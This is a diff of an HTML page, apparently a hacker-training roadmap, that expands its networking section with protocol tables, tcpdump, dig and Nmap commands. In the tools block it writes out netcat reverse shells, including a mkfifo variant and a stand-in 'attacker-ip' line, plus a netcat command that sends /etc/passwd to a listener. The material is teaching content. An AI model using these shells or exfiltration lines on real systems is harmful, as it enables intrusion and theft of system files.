@@ -741,55 +741,176 @@ for port in range(1, 1025):
 				</div>
 				</section>
 
-
-	
-	<!-- ======================== STEP 2 ======================== -->
-	<section id="step2">
-	<div class="section-header">
-	<h2>2. Networking (Critical for Hackers)</h2>
-	<p class="text-secondary">If you cannot read packets, you are not a hacker. This is where real reconnaissance happens.</p>
-	</div>
-	<div class="row g-4">
-	<div class="col-md-6">
-	<div class="hacker-card border-success">
-	<span class="badge-step bg-success">Core Models</span>
-	<h5>OSI 7 Layers vs TCP/IP Model</h5>
-	<div class="detailed-explain">
-	<p><strong>Layer 1–2:</strong> Physical &amp; Data Link (MAC addresses, switches).<br>
-	<strong>Layer 3:</strong> Network (IP, routing, ICMP).<br>
-	<strong>Layer 4:</strong> Transport (TCP vs UDP — three-way handshake, flags).<br>
-	<strong>Layer 5–7:</strong> Session, Presentation, Application (HTTP, DNS, TLS).</p>
-	<p>TCP is connection-oriented and reliable; UDP is fire-and-forget. Understand SYN flood, ACK scan, etc.</p>
-	</div>
-	<div class="terminal-block">tcpdump -i eth0 tcp port 80 -nn -X<br>wireshark</div>
-	</div>
-	</div>
-	<div class="col-md-6">
-	<div class="hacker-card">
-	<h5>DNS, HTTP/HTTPS, Routing, NAT, Firewalls, VPNs</h5>
-	<div class="detailed-explain">
-	<p>DNS: A/AAAA, MX, NS records. Zone transfers are still possible on misconfigured servers.<br>
-	HTTP: Methods (GET/POST/PUT), headers (User-Agent, Cookie, Authorization), status codes.<br>
-	HTTPS: TLS 1.2/1.3 handshake, certificate pinning.<br>
-	Firewalls: Stateful vs stateless, iptables/nftables rules.<br>
-	VPNs: OpenVPN, WireGuard, IPsec — learn to pivot through them.</p>
-	</div>
-	<div class="pros-cons">
-	<strong>DO:</strong> Capture and analyze your own browsing traffic every day for a week.<br>
-	<strong>DON'T:</strong> Trust "it's HTTPS" without checking certificate and HSTS.
-	</div>
-	</div>
-	</div>
-	<div class="col-12">
-	<div class="hacker-card">
-	<h5>Tools Mastery — Nmap, Netcat, Wireshark</h5>
-	<div class="terminal-block"># Full reconnaissance scan<br>nmap -sS -sV -O --script vuln -p- -T4 192.168.1.0/24<br><br># Bind shell with Netcat<br>nc -lvnp 4444<br># Reverse shell<br>nc -e /bin/sh attacker-ip 4444</div>
-	<a href="https://nmap.org/book/" target="_blank" class="btn btn-resource">Nmap Official Book (free PDF)</a>
-	<a href="https://www.wireshark.org/docs/" target="_blank" class="btn btn-resource mt-2">Wireshark University Labs</a>
-	</div>
-	</div>
-	</div>
-	</section>
+				<!-- ======================== STEP 2 ======================== -->
+				<section id="step2">
+				<div class="section-header">
+				<h2>2. Networking (Critical for Hackers)</h2>
+				<p class="text-secondary">If you cannot comfortably read and understand raw network packets, you are not yet a hacker — you're just running tools. Networking is the nervous system of every attack surface: reconnaissance, lateral movement, command & control, exfiltration, pivoting — they all live here. This section is where theory meets invisible reality. Plan 6–10 weeks. Capture traffic daily. Dissect everything.</p>
+				</div>
+				
+				<div class="row g-4">
+				
+				<!-- Core Models – Deep OSI vs TCP/IP -->
+				<div class="col-md-6">
+				<div class="hacker-card border-success">
+				<span class="badge-step bg-success">Core Models</span>
+				<h5>OSI 7 Layers vs TCP/IP Model – With Attack Relevance</h5>
+				
+				<div class="detailed-explain">
+				<p>The OSI model is theoretical (7 layers), TCP/IP is what the real internet uses (4–5 layers). You need both to understand tools and attacks.</p>
+				
+				<table class="table table-sm table-dark mt-3">
+				<thead>
+				<tr><th>OSI Layer</th><th>Name</th><th>TCP/IP Equivalent</th><th>Key Protocols</th><th>Common Attacks / Relevance</th></tr>
+				</thead>
+				<tbody>
+				<tr><td>1</td><td>Physical</td><td>—</td><td>Ethernet cable, Wi-Fi signals</td><td>Wiretapping, signal jamming, MAC spoofing</td></tr>
+				<tr><td>2</td><td>Data Link</td><td>Link</td><td>Ethernet, ARP, MAC addresses</td><td>ARP poisoning, MAC flooding, switch spoofing</td></tr>
+				<tr><td>3</td><td>Network</td><td>Internet</td><td>IP, ICMP, routing</td><td>IP spoofing, routing attacks, ICMP flood, TTL manipulation</td></tr>
+				<tr><td>4</td><td>Transport</td><td>Transport</td><td>TCP, UDP</td><td>SYN flood, TCP sequence prediction, UDP amplification, port scanning</td></tr>
+				<tr><td>5</td><td>Session</td><td>—</td><td>NetBIOS, RPC</td><td>Session hijacking, TCP session replay</td></tr>
+				<tr><td>6</td><td>Presentation</td><td>—</td><td>TLS/SSL, compression</td><td>Padding oracle, BEAST/CRIME/BREACH attacks</td></tr>
+				<tr><td>7</td><td>Application</td><td>Application</td><td>HTTP, DNS, SMTP, FTP</td><td>SQLi, XSS, DNS cache poisoning, HTTP smuggling</td></tr>
+				</tbody>
+				</table>
+				
+				<p><strong>TCP vs UDP – Core Differences Hackers Exploit</strong></p>
+				<ul>
+				<li><strong>TCP</strong>: connection-oriented, reliable, ordered, flow-controlled → three-way handshake (SYN → SYN-ACK → ACK), sequence numbers, retransmissions</li>
+				<li><strong>UDP</strong>: connectionless, unreliable, fast → no handshake, no guarantees → perfect for amplification attacks, DNS, VoIP, gaming</li>
+				</ul>
+				
+				<p>→ Most stealth scans target TCP flags (SYN, ACK, FIN, RST, etc.). UDP scans are noisier but reveal services that ignore ICMP unreachable messages.</p>
+				</div>
+				
+				<div class="terminal-block">
+				# Capture HTTP traffic (unencrypted) – shows headers, methods, etc.
+				tcpdump -i any -nn -A 'tcp port 80'
+				
+				# Capture HTTPS handshake (encrypted payload, but metadata visible)
+				tcpdump -i any -nn 'tcp port 443' -c 20
+				
+				# See full packet with hex + ASCII (-X = both hex and ASCII)
+				tcpdump -i eth0 -nn -X 'tcp port 80 and host 192.168.1.100'
+				
+				# Launch Wireshark (GUI – best for deep analysis)
+				wireshark &
+				</div>
+				
+				<div class="pros-cons mt-3">
+				<strong>DO:</strong> For 14 days straight: open Wireshark → browse normal websites → stop capture → filter http / tls → read every header and TLS handshake.<br>
+				<strong>DON'T:</strong> Skip learning TCP flags — half of Nmap scan types and evasion techniques rely on them.<br>
+				<strong>Pro:</strong> You start seeing attacks before they happen (unusual SYN volume = flood, strange DNS queries = C2).<br>
+				<strong>Con of weak networking:</strong> You run Nmap blindly and miss why something failed.
+				</div>
+				</div>
+				</div>
+				
+				<!-- DNS, HTTP/HTTPS, Routing, NAT, Firewalls, VPNs -->
+				<div class="col-md-6">
+				<div class="hacker-card">
+				<h5>DNS • HTTP/HTTPS • Routing • NAT • Firewalls • VPNs – Deep Dive</h5>
+				
+				<div class="detailed-explain">
+				<p><strong>DNS (Domain Name System)</strong></p>
+				<ul class="small">
+				<li>Records: A (IPv4), AAAA (IPv6), CNAME, MX (mail), NS (nameserver), TXT (SPF, DKIM), SRV</li>
+				<li>Attacks: cache poisoning, zone transfer (AXFR), amplification (ANY query), DNS tunneling</li>
+				<li>Command: <code>dig +short example.com ANY</code>, <code>dig @ns.example.com example.com AXFR</code> (if allowed)</li>
+				</ul>
+				
+				<p><strong>HTTP / HTTPS</strong></p>
+				<ul class="small">
+				<li>Methods: GET, POST, HEAD, PUT, DELETE, OPTIONS, PATCH</li>
+				<li>Headers attackers abuse: User-Agent, Referer, Cookie, Host, X-Forwarded-For, Authorization</li>
+				<li>Status codes: 200 OK, 301/302 redirect, 403 Forbidden, 404 Not Found, 500 Internal Error</li>
+				<li>TLS handshake: ClientHello → ServerHello → Certificate → Key Exchange → Finished</li>
+				</ul>
+				
+				<p><strong>Routing & NAT</strong></p>
+				<ul class="small">
+				<li>Routing: how packets find path (BGP, OSPF, static routes)</li>
+				<li>NAT: hides internal IPs (PAT most common) – attackers use source NAT evasion</li>
+				</ul>
+				
+				<p><strong>Firewalls</strong></p>
+				<ul class="small">
+				<li>Stateless: looks at each packet alone (old)</li>
+				<li>Stateful: tracks connections (modern default)</li>
+				<li>Next-Gen: app-layer inspection, IPS</li>
+				<li>Linux: iptables (legacy), nftables (modern), ufw (simple frontend)</li>
+				</ul>
+				
+				<p><strong>VPNs</strong></p>
+				<ul class="small">
+				<li>OpenVPN: SSL/TLS-based, flexible but slower</li>
+				<li>WireGuard: modern, very fast, minimal code</li>
+				<li>IPsec: used in site-to-site, complex</li>
+				<li>Hacker use: pivot through compromised VPN, split-tunnel leaks</li>
+				</ul>
+				</div>
+				
+				<div class="pros-cons mt-3">
+				<strong>DO:</strong> Every day for a week: 1) open browser → visit 5 sites, 2) capture in Wireshark, 3) filter tls.handshake → read ClientHello/ServerHello, 4) check cipher suites & certificate chain.<br>
+				<strong>DON'T:</strong> Ever assume HTTPS = secure. Check for missing HSTS, weak ciphers, self-signed certs.<br>
+				<strong>Pro:</strong> You can spot C2 traffic, data exfil, command injection in HTTP, DNS tunneling attempts.<br>
+				<strong>Con:</strong> Blind trust in "encrypted" traffic = missing 90% of modern attacks.
+				</div>
+				</div>
+				</div>
+				
+				<!-- Tools Mastery – Expanded with Examples -->
+				<div class="col-12">
+				<div class="hacker-card">
+				<h5>Tools Mastery — Nmap, Netcat, Wireshark – Real-World Usage & Examples</h5>
+				
+				<div class="detailed-explain">
+				<p><strong>Nmap</strong> – The Swiss Army knife of network discovery & vuln scanning.</p>
+				<p><strong>Netcat (nc)</strong> – The "Swiss Army knife" of TCP/UDP – bind shells, file transfer, port forwarding.</p>
+				<p><strong>Wireshark</strong> – Best packet analyzer – follow streams, export objects, decode protocols.</p>
+				</div>
+				
+				<div class="terminal-block">
+				# Stealth SYN scan + version detection + OS fingerprint + vuln scripts
+				# -sS = SYN scan (stealthiest), -sV = service version, -O = OS guess, --script vuln = common vuln checks
+				nmap -sS -sV -O --script vuln -p- -T4 --min-rate 1000 192.168.1.0/24
+				
+				# Aggressive scan (loud but thorough)
+				nmap -A -T4 scanme.nmap.org
+				
+				# Netcat – Listener (bind shell) on attacker machine
+				nc -lvnp 4444
+				
+				# Netcat – Reverse shell from victim (connect back)
+				# On victim machine:
+				nc -e /bin/sh 192.168.1.50 4444    # classic (may not work on modern nc)
+				# Better modern version (no -e needed):
+				rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.50 4444 >/tmp/f
+				
+				# Quick file transfer with Netcat
+				# Listener:
+				nc -lvnp 9999 > stolen-file.txt
+				# Sender:
+				nc 192.168.1.50 9999 < /etc/passwd
+				</div>
+				
+				<div class="mt-3">
+				<a href="https://nmap.org/book/" target="_blank" class="btn btn-resource btn-sm">Nmap Official Book – Read chapters 1–5 first</a>
+				<a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" class="btn btn-resource btn-sm mt-2">Wireshark User's Guide – Start with Chapter 3 (Filtering)</a>
+				<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjwvBI-hmbZ2rjmRwhC3sUDS" target="_blank" class="btn btn-resource btn-sm mt-2">Hak5 – Netcat & Nmap Tutorials (practical)</a>
+				</div>
+				
+				<div class="pros-cons mt-3">
+				<strong>DO:</strong> Run Nmap on your home router / IoT devices (with permission) → understand what services respond and why.<br>
+				<strong>DON'T:</strong> Scan networks without authorization — even "just looking" can be illegal.<br>
+				<strong>Pro:</strong> You can map entire networks, find misconfigurations, and write custom Nmap scripts later.<br>
+				<strong>Con:</strong> Blind Nmap usage = noisy, easily detected, incomplete results.
+				</div>
+				</div>
+				</div>
+				
+				</div>
+				</section>
 	
 	<!-- ======================== STEP 3 ======================== -->
 	<section id="step3">
